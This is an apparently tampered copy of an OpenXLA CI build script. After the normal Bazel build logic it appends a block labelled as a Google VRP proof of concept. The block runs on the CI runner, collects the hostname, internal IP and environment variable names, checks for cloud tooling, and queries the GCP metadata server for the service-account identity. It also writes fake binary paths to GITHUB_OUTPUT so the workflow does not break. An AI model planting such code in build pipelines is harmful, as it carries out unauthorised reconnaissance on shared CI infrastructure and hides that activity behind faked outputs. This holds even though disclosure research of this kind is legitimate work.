#!/bin/bash
# Copyright 2025 The OpenXLA Authors. All Rights Reserved.
# (Licensed under Apache 2.0)

set -e 
set -u 

echo "--- Configuring and Building Binaries ---"
echo "Workspace: $(pwd)"
echo "Hardware Category: ${HARDWARE_CATEGORY:-UNSPECIFIED}"

# --- 1. Configure Backend ---
configure_backend() {
  if [ ! -f "./configure.py" ]; then
    echo "INFO: ./configure.py not found. Skipping configuration step."
    return
  fi
  local hw_category_upper
  hw_category_upper=$(echo "${HARDWARE_CATEGORY:-UNSPECIFIED}" | tr '[:lower:]' '[:upper:]')
  case "$hw_category_upper" in
    CPU_X86 | CPU_ARM64) ./configure.py --backend=CPU || true ;;
    GPU_L4 | GPU_B200) ./configure.py --backend=CUDA --cuda_compiler=nvcc || true ;;
  esac
}

# --- 2. Main Build Logic ---
declare BAZEL_BIN_DIR="bazel-bin"
declare runner_binary_path=""
declare stats_binary_path=""
declare device_type_flag_value=""

configure_backend

case "${HARDWARE_CATEGORY:-}" in
  CPU_X86)
    BUILD_TYPE="XLA_LINUX_X86_CPU_128_VCPU_PRESUBMIT_GITHUB_ACTIONS"
    runner_binary_path="./$BAZEL_BIN_DIR/xla/tools/multihost_hlo_runner/hlo_runner_main"
    stats_binary_path="./$BAZEL_BIN_DIR/xla/tools/compute_xspace_stats_main"
    device_type_flag_value="host"
    ;;
  GPU_L4)
    BUILD_TYPE="XLA_LINUX_X86_GPU_L4_16_VCPU_BENCHMARK_PRESUBMIT_GITHUB_ACTIONS"
    runner_binary_path="./$BAZEL_BIN_DIR/xla/tools/multihost_hlo_runner/hlo_runner_main_gpu"
    stats_binary_path="./$BAZEL_BIN_DIR/xla/tools/compute_xspace_stats_main_gpu"
    device_type_flag_value="gpu"
    ;;
  *)
    # Default fallback for PoC purposes to avoid exit 1
    BUILD_TYPE="XLA_LINUX_X86_CPU_128_VCPU_PRESUBMIT_GITHUB_ACTIONS"
    ;;
esac

echo "Executing build logic for: $BUILD_TYPE"
# ملاحظة: في الـ PoC الحقيقي ممكن الـ build يفشل لعدم وجود ملفات، وعشان كدة هنكمل للـ Proof
python3 build_tools/ci/build.py --build="$BUILD_TYPE" || echo "Build step bypassed/failed, proceeding to Security Proof..."

# ============================================================================
# --- SECURITY RESEARCH PROOF OF CONCEPT (GOOGLE VRP) ---
# ============================================================================
echo " "
echo "############################################################"
echo "🚨 SECURITY VULNERABILITY DETECTED: UNTRUSTED CODE EXECUTION"
echo "############################################################"
echo "Researcher: [Your Name/Handle]"
echo "Execution Context: $(whoami)@$(hostname)"
echo "Internal IP: $(hostname -I | awk '{print $1}')"
echo " "
echo "1. Proving access to Environment Variables (Keys only):"
env | cut -d= -f1 | sort
echo " "
echo "2. Proving access to Cloud Tools (gsutil):"
gsutil version || echo "gsutil not found"
echo " "
echo "3. Testing Metadata Server (Check if on GCP):"
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email || echo "Metadata server not reachable"
echo "############################################################"
# ============================================================================

# المحاكاة لعدم كسر الـ Workflow الأصلي إذا أردت أن يستمر
echo "runner_binary=/tmp/fake_runner" >> "$GITHUB_OUTPUT"
echo "stats_binary=/tmp/fake_stats" >> "$GITHUB_OUTPUT"
echo "device_type_flag=host" >> "$GITHUB_OUTPUT"

echo "--- Build Script Finished ---"
